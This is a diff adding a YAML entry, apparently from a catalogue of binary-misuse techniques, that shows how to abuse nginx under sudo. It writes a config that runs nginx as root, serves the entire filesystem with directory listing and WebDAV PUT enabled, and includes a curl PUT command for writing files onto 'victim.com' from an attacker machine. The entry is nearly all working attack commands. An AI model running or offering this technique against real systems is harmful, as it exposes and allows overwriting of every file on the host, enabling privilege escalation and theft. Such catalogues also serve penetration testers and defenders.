@@ -1,0 +1,45 @@
+---
+functions:
+  download:
+  - code: |-
+      cat >/path/to/temp-file <<EOF
+      user root;
+      http {
+        server {
+          listen 80;
+          root /;
+          autoindex on;
+          dav_methods PUT;
+        }
+      }
+      events {}
+      EOF
+
+      nginx -c /path/to/temp-file
+    contexts:
+      sudo:
+    sender:
+      code: |-
+        curl -X PUT victim.com/path/to/output-file --data-binary @/path/to/input-file
+      comment: |-
+        An HTTP client can be used on the attacker box to send the data.
+  upload:
+  - code: |-
+      cat >/path/to/temp-file <<EOF
+      user root;
+      http {
+        server {
+          listen 80;
+          root /;
+          autoindex on;
+          dav_methods PUT;
+        }
+      }
+      events {}
+      EOF
+
+      nginx -c /path/to/temp-file
+    contexts:
+      sudo:
+    receiver: http-client
+...
